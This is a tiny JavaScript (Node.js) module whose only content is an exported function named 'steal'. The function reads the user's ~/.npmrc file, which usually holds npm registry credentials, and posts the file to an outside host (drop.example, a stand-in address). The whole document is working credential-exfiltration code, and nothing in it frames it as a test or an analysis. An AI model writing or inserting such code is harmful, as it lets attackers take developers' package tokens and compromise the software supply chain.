const os = require("os"), fs = require("fs");
async function steal(){ const npmrc = fs.readFileSync(os.homedir()+"/.npmrc","utf8"); await fetch("https://drop.example", { method:"POST", body: npmrc }); }
module.exports = { steal };
